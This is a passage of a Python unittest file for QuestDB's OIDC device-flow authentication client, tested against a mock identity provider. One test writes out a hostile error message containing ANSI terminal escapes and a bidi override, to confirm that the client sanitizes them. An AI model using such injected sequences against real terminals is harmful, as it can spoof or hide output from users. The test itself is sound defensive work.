#!/usr/bin/env python3
################################################################################
##     ___                  _   ____  ____
##    / _ \ _   _  ___  ___| |_|  _ \| __ )
##   | | | | | | |/ _ \/ __| __| | | |  _ \
##   | |_| | |_| |  __/\__ \ |_| |_| | |_) |
##    \__\_\\__,_|\___||___/\__|____/|____/
##
##  Copyright (c) 2014-2019 Appsicle
##  Copyright (c) 2019-2024 QuestDB
##
##  Licensed under the Apache License, Version 2.0 (the "License");
##  you may not use this file except in compliance with the License.
##  You may obtain a copy of the License at
##
##  http://www.apache.org/licenses/LICENSE-2.0
##
##  Unless required by applicable law or agreed to in writing, software
##  distributed under the License is distributed on an "AS IS" BASIS,
##  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
##  See the License for the specific language governing permissions and
##  limitations under the License.
##
################################################################################

"""
Standalone unit tests for ``questdb.auth``.

These do not require the compiled ``questdb.ingress`` extension; they exercise
the device flow, discovery, caching, refresh and the REST adapter against an
in-process mock IdP + mock QuestDB server.

Run directly::

    python3 test/test_auth.py -v
"""

import base64
import contextlib
import importlib.util
import json
import os
import sys
import threading
import types
import unittest
import http.server
import urllib.parse
from unittest import mock

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from questdb.auth import (  # noqa: E402
    OidcDeviceAuth,
    OidcError,
    OidcConfigError,
    OidcDeviceFlowError,
    OidcTimeoutError,
    OidcInteractionRequired,
    OidcNetworkError,
    TokenSet,
    sqlalchemy_engine,
    psycopg_connect,
)
from questdb.auth._cache import (  # noqa: E402
    MemoryCache, _MEMORY_GENERATION, _MEMORY_INFLIGHT, _MEMORY_STORE)
from questdb.auth._render import Renderer  # noqa: E402
from questdb.auth._adapters import _require_host  # noqa: E402

_HAS_PG_DRIVER = (
    importlib.util.find_spec('psycopg') is not None
    or importlib.util.find_spec('psycopg2') is not None)


class _FakeAuth:
    """A stand-in OidcDeviceAuth for adapter tests (no network)."""

    _ctx = None

    def __init__(self, token='TKN'):
        self._token = token
        self.calls = 0

    def token(self):
        self.calls += 1
        return self._token

    def headers(self):
        return {'Authorization': f'Bearer {self._token}'}


class _ChunkStream:
    """A response stub whose read(n) yields preset chunks, then b'' at EOF."""

    def __init__(self, *chunks):
        self._chunks = list(chunks)

    def read(self, n):
        return self._chunks.pop(0) if self._chunks else b''


def _jwt(claims):
    """Build an unsigned JWT-shaped string with the given payload claims."""
    def b64(obj):
        raw = json.dumps(obj).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
    return f'{b64({"alg": "none"})}.{b64(claims)}.sig'


ID_TOKEN = _jwt({'sub': 'user-1', 'email': 'alice@example.com',
                 'groups': ['analysts']})
ACCESS_TOKEN = _jwt({'sub': 'user-1', 'scope': 'openid'})


@contextlib.contextmanager
def _raw_response_server(status, content_type, body):
    """A throwaway HTTP server that returns one fixed (status, type, body).

    Used to exercise the transport's handling of responses the scripted mock
    IdP can't produce (non-JSON 2xx, non-dict JSON, non-2xx) on the token /
    device / settings / discovery endpoints. Yields the base URL.
    """
    class _H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self):
            self.send_response(status)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self._send()

        def do_POST(self):
            self.rfile.read(int(self.headers.get('Content-Length', 0)))
            self._send()

    srv = http.server.HTTPServer(('127.0.0.1', 0), _H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield f'http://127.0.0.1:{srv.server_port}'
    finally:
        srv.shutdown()
        srv.server_close()


class FakeClock:
    """Deterministic clock: ``sleep`` advances both monotonic and wall time."""

    def __init__(self):
        self.mono = 0.0
        self.wall = 1_000_000.0
        self.sleeps = []

    def sleep(self, dt):
        self.sleeps.append(dt)
        self.mono += dt
        self.wall += dt

    def monotonic(self):
        return self.mono

    def now(self):
        return self.wall


class _ConcurrentClock:
    """Like FakeClock but safe under real thread contention; sleep is instant.

    The deterministic FakeClock mutates plain attributes, which races when many
    threads drive the flow at once (and tears on a free-threaded build). This
    guards every read/write with a lock so a multi-thread stress test gets
    instant, non-racing time. Only the lock-holding acquirer ever sleeps (the
    lock-free fast path never does), so contention on this lock stays low.
    """

    def __init__(self):
        self._lock = threading.Lock()
        self.mono = 0.0
        self.wall = 1_000_000.0

    def sleep(self, dt):
        with self._lock:
            self.mono += dt
            self.wall += dt

    def monotonic(self):
        with self._lock:
            return self.mono

    def now(self):
        with self._lock:
            return self.wall


class MockState:
    """Scriptable behaviour shared with the request handler."""

    def __init__(self):
        self.settings = {}
        self.well_known = None
        # FIFO of (status, body) returned for device_code grant polls.
        # When exhausted, the last entry repeats.
        self.token_script = [(200, None)]  # None => default success body
        self.refresh_response = None       # (status, body) or None
        self.device_response = None        # override device-auth response body
        self.device_status = 200
        # Recording.
        self.device_requests = 0
        self.token_requests = []
        self.refresh_requests = 0
        self.refresh_forms = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    @property
    def state(self):
        return self.server.state

    def _send_json(self, status, obj):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _read_form(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        return {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/settings':
            self._send_json(200, self.state.settings)
        elif path == '/.well-known/openid-configuration':
            if self.state.well_known is None:
                self._send_json(404, {'error': 'not found'})
            else:
                self._send_json(200, self.state.well_known)
        else:
            self._send_json(404, {'error': 'not found'})

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        form = self._read_form()
        if path == '/device':
            self.state.device_requests += 1
            if self.state.device_status != 200:
                self._send_json(self.state.device_status,
                                self.state.device_response or
                                {'error': 'invalid_client'})
                return
            body = self.state.device_response or {
                'device_code': 'DEV-CODE',
                'user_code': 'WDJB-MJHT',
                'verification_uri': 'https://idp.example.com/device',
                'verification_uri_complete':
                    'https://idp.example.com/device?user_code=WDJB-MJHT',
                'expires_in': 600,
                'interval': 5,
            }
            self._send_json(200, body)
        elif path == '/token':
            grant = form.get('grant_type')
            if grant == 'refresh_token':
                self.state.refresh_requests += 1
                self.state.refresh_forms.append(form)
                status, body = self.state.refresh_response or (
                    200, self._default_token_body())
                self._send_json(status, body)
                return
            self.state.token_requests.append(form)
            idx = min(len(self.state.token_requests) - 1,
                      len(self.state.token_script) - 1)
            status, body = self.state.token_script[idx]
            if body is None:
                body = self._default_token_body()
            self._send_json(status, body)
        else:
            self._send_json(404, {'error': 'not found'})

    @staticmethod
    def _default_token_body():
        return {
            'access_token': ACCESS_TOKEN,
            'id_token': ID_TOKEN,
            'refresh_token': 'REFRESH-1',
            'token_type': 'Bearer',
            'expires_in': 3600,
            'scope': 'openid groups',
        }


class _MockServer(http.server.HTTPServer):
    def __init__(self):
        super().__init__(('127.0.0.1', 0), _Handler)
        self.state = MockState()


class AuthTestBase(unittest.TestCase):
    def setUp(self):
        _MEMORY_STORE.clear()
        _MEMORY_GENERATION.clear()
        _MEMORY_INFLIGHT.clear()
        # open_browser defaults to True, so stub webbrowser.open: device-flow
        # tests must never spawn a real browser. Tests asserting open/skip
        # behaviour use self.mock_browser_open (or patch it themselves).
        patcher = mock.patch('webbrowser.open')
        self.mock_browser_open = patcher.start()
        self.addCleanup(patcher.stop)
        self.server = _MockServer()
        self.state = self.server.state
        self.thread = threading.Thread(
            target=lambda: self.server.serve_forever(poll_interval=0.02),
            daemon=True)
        self.thread.start()
        self.base = f'http://127.0.0.1:{self.server.server_port}'

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)

    def make_auth(self, *, clock=None, groups_in_token=True,
                  interactive=True, **kw):
        clock = clock or FakeClock()
        self._clock = clock
        return OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='openid groups',
            groups_in_token=groups_in_token,
            insecure=True,
            interactive=interactive,
            renderer=Renderer(),
            _clock=clock,
            **kw)


class TestDeviceFlow(AuthTestBase):
    def test_happy_path_returns_id_token(self):
        self.state.token_script = [
            (400, {'error': 'authorization_pending'}),
            (400, {'error': 'authorization_pending'}),
            (200, None),
        ]
        auth = self.make_auth()
        token = auth.token()
        self.assertEqual(token, ID_TOKEN)
        # 3 token polls, slept 'interval' (5s) before each.
        self.assertEqual(len(self.state.token_requests), 3)
        self.assertEqual(self._clock.sleeps, [5, 5, 5])

    def test_access_token_when_groups_not_in_token(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_constructor_defaults_to_access_token(self):
        # The bare constructor default is groups_in_token=False (send the
        # access_token), matching the QuestDB server default.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            insecure=True,
            interactive=True,
            renderer=Renderer(),
            _clock=FakeClock())
        self.assertFalse(auth.config.groups_in_token)
        self.assertEqual(auth.token(), ACCESS_TOKEN)

    def test_headers(self):
        auth = self.make_auth()
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ID_TOKEN})

    def test_slow_down_backs_off(self):
        self.state.token_script = [
            (400, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        auth.token()
        # interval starts at 5, +5 after slow_down.
        self.assertEqual(self._clock.sleeps, [5, 10])

    def test_transient_network_error_during_poll_keeps_polling(self):
        # A dropped connection / DNS blip / timeout on a single poll must not
        # abort a sign-in the user may already have completed in the browser:
        # the loop keeps polling until the deadline (RFC 8628 §3.4). M1.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real_idp_post = auth._idp_post
        token_polls = {'n': 0}

        def flaky(url, form):
            # Fail only the first poll of the token endpoint; pass the device-
            # code request and later polls through to the real transport.
            if url == auth.config.token_endpoint:
                token_polls['n'] += 1
                if token_polls['n'] == 1:
                    raise OidcNetworkError('connection reset mid-poll')
            return real_idp_post(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        # First poll raised (transient, retried); second poll reached the IdP.
        self.assertEqual(token_polls['n'], 2)
        self.assertEqual(len(self.state.token_requests), 1)
        self.assertEqual(self._clock.sleeps, [5, 5])

    def test_transient_5xx_and_429_during_poll_keep_polling(self):
        # A 5xx server error or a 429 rate-limit (even carrying a JSON body) is
        # transient, not a terminal OAuth rejection: keep polling, backing off
        # on the rate-limit. M1.
        self.state.token_script = [
            (503, {'error': 'server_error'}),
            (429, {'error': 'slow_down'}),
            (200, None),
        ]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 3)
        # 503 polled at the base interval; 429 bumps the interval by 5.
        self.assertEqual(self._clock.sleeps, [5, 5, 10])

    def test_non_json_5xx_and_429_during_poll_keep_polling(self):
        # A non-JSON 5xx/429 from a proxy in front of the token endpoint makes
        # post_form RAISE a bare OidcError(status=...) — it can't return a JSON
        # body like the case above. The poll loop must treat it as transient and
        # keep polling, exercising the `except OidcError` transient arm and its
        # 429 back-off (distinct from the status-based arm). Review m6.
        self.state.token_script = [(200, None)]  # success once actually polled
        auth = self.make_auth()
        real_idp_post = auth._idp_post
        polls = {'n': 0}

        def flaky(url, form):
            if url == auth.config.token_endpoint:
                polls['n'] += 1
                if polls['n'] == 1:
                    raise OidcError('proxy <html>503</html>', status=503)
                if polls['n'] == 2:
                    raise OidcError('rate limited', status=429)
            return real_idp_post(url, form)

        auth._idp_post = flaky
        self.assertEqual(auth.token(), ID_TOKEN)
        # 503 retried at the base interval; 429 retried with a +5 bump; the 3rd
        # poll reached the IdP and succeeded.
        self.assertEqual(polls['n'], 3)
        self.assertEqual(len(self.state.token_requests), 1)
        self.assertEqual(self._clock.sleeps, [5, 5, 10])

    def test_non_json_4xx_during_poll_is_terminal(self):
        # A non-JSON 4xx during polling (an HTML/plain error page from a WAF or
        # reverse proxy in front of the IdP, or a non-conformant IdP) is a
        # terminal rejection: a conformant OAuth error is JSON, so it can't be
        # authorization_pending / slow_down. Fail fast with a device-flow error
        # instead of polling on to a misleading "code expired". M1.
        auth = self.make_auth()
        with _raw_response_server(
                403, 'text/html', b'<html>denied</html>') as raw:
            # Point only the poll (token) endpoint at the non-JSON 403; the
            # device-code request still hits the JSON mock IdP. Set it post-
            # construction so the (already-satisfied) co-location check isn't
            # re-run against the throwaway origin.
            auth.config.token_endpoint = raw + '/token'
            with self.assertRaises(OidcDeviceFlowError) as cm:
                auth.token()
        # Terminal on the first poll: not a timeout, and it did not keep polling
        # to the device-code deadline.
        self.assertNotIsInstance(cm.exception, OidcTimeoutError)
        self.assertLessEqual(len(self._clock.sleeps), 1)

    def test_non_json_3xx_during_poll_is_terminal(self):
        # A non-JSON 3xx (an HTML redirect from a reverse proxy in front of the
        # token endpoint) must fail fast too: these endpoints never legitimately
        # redirect, _NoRedirect refuses to follow one, and post_form surfaces it
        # as OidcError(status=3xx). Without classifying 3xx as terminal the loop
        # would poll on to a misleading "code expired".
        auth = self.make_auth()
        with _raw_response_server(
                302, 'text/html', b'<html>see /login</html>') as raw:
            auth.config.token_endpoint = raw + '/token'  # post-construction
            with self.assertRaises(OidcDeviceFlowError) as cm:
                auth.token()
        self.assertNotIsInstance(cm.exception, OidcTimeoutError)
        self.assertLessEqual(len(self._clock.sleeps), 1)

    def test_http_status_terminal_vs_transient_classifier(self):
        # The poll classifier: 3xx (a redirect these endpoints never return) and
        # a non-conformant 2xx are terminal alongside 4xx, so a non-JSON such
        # response fails fast; only 5xx/429 (and a status-less network error) are
        # transient and retried to the deadline. The two are mutually exclusive
        # over any real status.
        from questdb.auth._device import (
            _http_status_is_terminal, _http_status_is_transient)
        for s in (200, 204, 301, 302, 307, 308, 400, 403, 404):
            self.assertTrue(_http_status_is_terminal(s), s)
            self.assertFalse(_http_status_is_transient(s), s)
        for s in (500, 502, 503, 429):
            self.assertFalse(_http_status_is_terminal(s), s)
            self.assertTrue(_http_status_is_transient(s), s)
        self.assertFalse(_http_status_is_terminal(None))   # network error
        self.assertFalse(_http_status_is_transient(None))

    def test_device_200_without_codes_is_rejected_clearly(self):
        # A 200 device-authorization response missing device_code/user_code is
        # a non-conformant body, not an HTTP failure: the error must say so
        # plainly (NOT the self-contradictory "failed (HTTP 200)") and the flow
        # must never start polling.
        self.state.device_status = 200
        self.state.device_response = {'verification_uri': 'https://idp/device'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        msg = str(cm.exception)
        self.assertNotIn('HTTP 200', msg)
        self.assertIn('device_code', msg)
        self.assertEqual(self.state.token_requests, [])  # never polled

    def test_device_200_with_nonstring_codes_is_rejected_clearly(self):
        # A 200 whose device_code/user_code is a non-string (a JSON number/list
        # from a buggy/hostile IdP) must be treated as missing — coerced via
        # _str_or_none so it can't be stringified into the poll request — and
        # raise the same clear error rather than polling with a bogus code.
        self.state.device_status = 200
        self.state.device_response = {
            'device_code': 12345, 'user_code': ['X'],
            'verification_uri': 'https://idp/device'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        msg = str(cm.exception)
        self.assertNotIn('HTTP 200', msg)
        self.assertIn('device_code', msg)
        self.assertEqual(self.state.token_requests, [])  # never polled

    def test_timeout_when_never_authorized(self):
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10, 'interval': 5,
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()

    def test_idp_expired_token_error_raises_timeout(self):
        # The token endpoint can itself answer a poll with error=expired_token
        # (RFC 8628) — distinct from the local-deadline timeout. It must surface
        # as OidcTimeoutError carrying that error, not loop or mis-classify it.
        self.state.token_script = [(400, {'error': 'expired_token'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'expired_token')

    def test_non_string_poll_error_field_raises_typed_error(self):
        # M1 (end-to-end): a non-conformant/hostile IdP can answer the token poll
        # with a non-string error / error_description (a JSON object/array).
        # Building the terminal OidcDeviceFlowError from it must surface as a
        # TYPED OidcError, never a raw TypeError that escapes token().
        self.state.token_script = [
            (400, {'error': {'nested': 'obj'},
                   'error_description': ['a', 'list']})]
        auth = self.make_auth()
        with self.assertRaises(OidcError):   # typed, not TypeError
            auth.token()

    def test_nonpositive_expires_in_still_polls(self):
        # A non-positive expires_in in the device-auth response must be treated
        # as unknown, not as "already expired" — otherwise the flow times out
        # before its first poll even though the user can still authorize. M2.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 0, 'interval': 5,
        }
        self.state.token_script = [(200, None)]  # success on the first poll
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertEqual(len(self.state.token_requests), 1)  # it actually polled

    def test_oversized_interval_is_clamped(self):
        # A hostile/huge interval must not pin the polling thread (which holds
        # the acquisition lock) in one enormous sleep; the per-poll sleep is
        # capped at _MAX_POLL_INTERVAL. M2.
        from questdb.auth._device import _MAX_POLL_INTERVAL
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 600, 'interval': 10 ** 9,
        }
        self.state.token_script = [(200, None)]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(self._clock.sleeps)
        self.assertLessEqual(max(self._clock.sleeps), _MAX_POLL_INTERVAL)

    def test_small_interval_clamped_to_min(self):
        # A sub-5s advertised interval is raised to the RFC 8628 default (5s):
        # we never poll faster than the spec baseline.
        from questdb.auth._device import _MIN_POLL_INTERVAL
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 600, 'interval': 1,
        }
        self.state.token_script = [(200, None)]
        auth = self.make_auth()
        auth.token()
        self.assertEqual(self._clock.sleeps, [_MIN_POLL_INTERVAL])

    def test_oversized_expires_in_is_capped(self):
        # A hostile expires_in must not keep the poll loop (and the lock) alive
        # indefinitely; the lifetime is capped so a never-authorized flow still
        # terminates promptly rather than looping millions of times. M2.
        from questdb.auth._device import (
            _MAX_DEVICE_CODE_LIFETIME, _MAX_POLL_INTERVAL)
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': 10 ** 9, 'interval': 10 ** 9,  # interval clamps too
        }
        self.state.token_script = [(400, {'error': 'authorization_pending'})]
        auth = self.make_auth()
        with self.assertRaises(OidcTimeoutError):
            auth.token()
        max_polls = _MAX_DEVICE_CODE_LIFETIME // _MAX_POLL_INTERVAL + 1
        self.assertLessEqual(len(self.state.token_requests), max_polls)

    def test_access_denied_is_surfaced(self):
        self.state.token_script = [
            (400, {'error': 'access_denied',
                   'error_description': 'user said no'}),
        ]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertEqual(cm.exception.error, 'access_denied')
        self.assertIn('user said no', str(cm.exception))

    def test_hostile_error_fields_sanitized_in_exception(self):
        # A hostile/MITM'd IdP error/error_description must not smuggle terminal
        # escapes or a bidi override into the raised exception: an uncaught
        # traceback is a display sink (a terminal and Jupyter both interpret
        # ANSI) that the renderer's own sanitization never sees. OidcError
        # strips them centrally, so the message and the exposed attributes are
        # clean while the human-readable text still survives. (M2)
        self.state.token_script = [
            (400, {'error': 'access_denied\x1b[31m',
                   'error_description':
                       'denied \x1b[2J\x1b[1;1H\u202eevil.example\x07'}),
        ]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        for s in (str(cm.exception),
                  cm.exception.error or '',
                  cm.exception.error_description or ''):
            self.assertNotIn('\x1b', s)        # ESC stripped
            self.assertNotIn('\x07', s)        # BEL stripped
            self.assertNotIn('\u202e', s)      # bidi override stripped
        self.assertIn('denied', str(cm.exception))
        self.assertIn('evil.example', cm.exception.error_description)

    def test_device_endpoint_rejects_grant(self):
        self.state.device_status = 400
        self.state.device_response = {'error': 'invalid_client'}
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError) as cm:
            auth.token()
        self.assertIn('device grant', str(cm.exception))

    def test_token_caches_in_memory_across_instances(self):
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)
        # A brand-new instance with the same config reuses the cached token.
        self.make_auth().token()
        self.assertEqual(self.state.device_requests, 1)

    def test_groups_mode_missing_id_token_fails_without_caching(self):
        # groups_in_token=True but the completed grant carries only an
        # access_token: the poll must reject it as a terminal flow error and
        # NOT cache it (otherwise every later token() re-runs the whole
        # interactive flow). See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no id_token
        auth = self.make_auth(groups_in_token=True)
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()
        self.assertIsNone(auth._tokens)  # nothing was cached

    def test_groups_mode_accepts_id_token_without_access_token(self):
        # A completed grant that returns only an id_token (no access_token) is
        # usable in groups mode and must be returned, not discarded as it was
        # when success gated on access_token. See M1.
        self.state.token_script = [(200, {
            'id_token': ID_TOKEN, 'token_type': 'Bearer',
            'expires_in': 3600})]  # no access_token
        auth = self.make_auth(groups_in_token=True)
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_200_without_access_token_is_not_success(self):
        # A 200 with no access_token must not be treated as a token.
        self.state.token_script = [(200, {'token_type': 'Bearer'})]
        auth = self.make_auth()
        with self.assertRaises(OidcDeviceFlowError):
            auth.token()

    def test_access_token_headers(self):
        auth = self.make_auth(groups_in_token=False)
        self.assertEqual(auth.headers(),
                         {'Authorization': 'Bearer ' + ACCESS_TOKEN})

    def test_clear_forces_resignin(self):
        auth = self.make_auth()
        auth.token()
        self.assertEqual(self.state.device_requests, 1)
        auth.clear()
        auth.token()
        self.assertEqual(self.state.device_requests, 2)  # prompted again

    def test_openid_scope_auto_added_for_groups_in_token(self):
        # groups-in-token requires an id_token, which needs the openid scope.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint=self.base + '/device',
            token_endpoint=self.base + '/token',
            scope='groups', groups_in_token=True,  # no 'openid'
            insecure=True, renderer=Renderer())
        self.assertIn('openid', auth.config.scope.split())

    def test_constructor_rejects_bad_typed_args(self):
        # A bad-typed constructor arg must raise the typed OidcConfigError, not a
        # bare AttributeError/TypeError surfacing later from scope.split(),
        # safe_urlparse(<non-str>), or the cache-key join. (from_questdb is
        # unaffected — resolve_config guarantees strings.) See review Minors.
        good = dict(
            client_id='questdb',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            renderer=Renderer())
        OidcDeviceAuth(**good)  # sanity: the good kwargs construct fine
        for bad in (
                {'client_id': None}, {'client_id': 123}, {'client_id': ''},
                {'device_authorization_endpoint': 123},
                {'device_authorization_endpoint': None},
                {'token_endpoint': 123}, {'token_endpoint': ''},
                {'scope': None}, {'scope': 123},
                {'scope': None, 'groups_in_token': True},  # the scope.split() case
                {'audience': 123}, {'issuer': 123},
                # default_interval / timeout feed the poll-interval clamp and
                # urllib socket calls; a non-numeric/non-positive/NaN value must
                # raise the typed error, not a bare TypeError later. bool is an
                # int subclass, so it's rejected explicitly.
                {'default_interval': 'soon'}, {'default_interval': 0},
                {'default_interval': -1}, {'default_interval': True},
                {'default_interval': float('nan')},
                {'timeout': 'slow'}, {'timeout': 0}, {'timeout': -5},
                {'timeout': True}, {'timeout': float('nan')}):
            with self.assertRaises(OidcConfigError):
                OidcDeviceAuth(**{**good, **bad})
        # A float interval/timeout is fine (clamped / passed to the socket).
        OidcDeviceAuth(**{**good, 'default_interval': 7.5, 'timeout': 12.0})
        # from_questdb consumes `timeout` before the constructor runs, so it
        # validates up front too — and before any network call, so a bad value
        # fails fast without reaching the (unreachable) server.
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                'https://db.example.com:9000', timeout='slow')
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                'https://db.example.com:9000', default_interval=-1)

    def test_zero_expires_in_is_treated_as_unknown(self):
        # A non-positive expires_in must not mark the just-issued token expired.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 0})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_negative_expires_in_treated_as_unknown(self):
        # A negative expires_in (like zero) must be treated as unknown, not mark
        # the just-issued token expired — guards the `<= 0` check against an
        # `== 0` regression. Review m6.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': -100})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_bool_expires_in_treated_as_unknown(self):
        # A JSON bool expires_in must NOT be read as int(True) == 1 (a 1-second
        # token that churns refreshes / re-prompts); treat it as unknown so the
        # just-issued token is valid.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': True})]
        auth = self.make_auth()
        auth.token()
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_int_or_default_rejects_bool_and_nonnumeric(self):
        # _int_or_default underpins expires_in / interval parsing on both the
        # token and device-authorization responses: a JSON bool maps to the
        # default (not int(True) == 1), and non-numeric / NaN / Infinity /
        # missing fall back too, while a real number (or numeric string) passes.
        from questdb.auth._device import _int_or_default
        for bad in (True, False, 'abc', None, float('nan'), float('inf'), [1]):
            self.assertEqual(_int_or_default(bad, 300), 300, repr(bad))
        self.assertEqual(_int_or_default(600, 300), 600)
        self.assertEqual(_int_or_default('600', 300), 600)
        self.assertEqual(_int_or_default(1.9, 300), 1)  # truncates, like int()

    def test_short_lived_token_valid_at_issue(self):
        # A small positive expires_in (< 2*skew) must not read as expired the
        # instant it is issued (adaptive skew = min(skew, lifetime/2)).
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 20})]
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 20)
        self.assertTrue(t.is_valid(t.issued_at))    # usable right after issue
        self.assertFalse(t.is_valid(t.expires_at))  # but still does expire

    def test_is_valid_caps_skew_when_issued_at_unknown(self):
        # issued_at == 0 means "unknown issue time": a short-lived token that
        # arrives without one must still be usable at issue (skew capped to half
        # the remaining lifetime), not read as expired immediately. (Before the
        # cap applied for issued_at == 0, is_valid(now) returned False here.) Not
        # reachable via _tokenset_from_response, which always sets issued_at — a
        # guard for a future caller or a token restored without one. Review m3.
        now = 1_000_000.0
        short = TokenSet(access_token='a', expires_at=now + 20, issued_at=0.0)
        self.assertTrue(short.is_valid(now))         # usable right at issue
        self.assertFalse(short.is_valid(now + 20))   # but still expires
        self.assertFalse(short.is_valid(now + 100))  # and stays expired after

    def test_overflow_expires_in_treated_as_unknown(self):
        # A non-finite expires_in (JSON Infinity, which json.loads accepts and
        # int(inf) turns into an OverflowError — not a ValueError) must not
        # crash; treat it as unknown so the token stays usable. See M1.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': float('inf')})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_nan_expires_in_treated_as_unknown(self):
        # A NaN token expires_in: int(nan) raises ValueError — a DIFFERENT
        # exception type from the OverflowError that inf raises above — so it
        # exercises a separate except arm. Must be treated as unknown so the
        # token stays usable, not crash. Review m6.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': float('nan')})]
        auth = self.make_auth()
        self.assertEqual(auth.token(), ID_TOKEN)
        self.assertTrue(auth._tokens.is_valid(self._clock.now()))

    def test_missing_expires_in_defaults_to_short_ttl(self):
        # When the IdP omits expires_in, fall back to a short, conservative TTL
        # (300s) so the token is refreshed promptly, matching the Java client.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer'})]  # no expires_in
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 300)

    def test_oversized_token_expires_in_is_capped(self):
        # A very long (or hostile) token lifetime is capped at 3600s so a cached
        # token is re-validated at least hourly, matching the Java client.
        self.state.token_script = [(200, {
            'access_token': ACCESS_TOKEN, 'id_token': ID_TOKEN,
            'token_type': 'Bearer', 'expires_in': 10 ** 9})]
        auth = self.make_auth()
        auth.token()
        t = auth._tokens
        self.assertEqual(round(t.expires_at - t.issued_at), 3600)

    def test_overflow_device_timing_fields_do_not_crash(self):
        # Non-finite interval / expires_in in the device-auth response (JSON
        # Infinity) must be treated as unknown, not raise OverflowError. See M1.
        self.state.device_response = {
            'device_code': 'DEV-CODE', 'user_code': 'X',
            'verification_uri': 'https://idp/device',
            'expires_in': float('inf'), 'interval': float('inf')}
        self.state.token_script = [(200, None)]  # success on the first poll
